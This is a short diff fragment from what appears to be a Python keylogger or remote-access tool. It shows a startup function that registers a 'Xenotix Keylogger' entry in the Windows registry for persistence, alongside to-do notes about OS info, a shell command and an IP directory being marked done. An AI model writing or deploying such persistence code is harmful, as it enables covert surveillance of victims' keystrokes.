@@ -10,8 +10,9 @@ def addStartup():
     keyVal,0,KEY_ALL_ACCESS)
 
     SetValueEx(key2change, "Xenotix Keylogger",0,REG_SZ, new_file_path)
--ajouter le nom de l'utilisateur dans os info
+-ajouter le nom de l'utilisateur dans os info done
 
--ajouter la commande clear dans shell
+-ajouter la commande clear dans shell done
 
--add directory to ip
+-add directory to ip done
+- https://github.com/keybraker/Python-GUI-with-electron
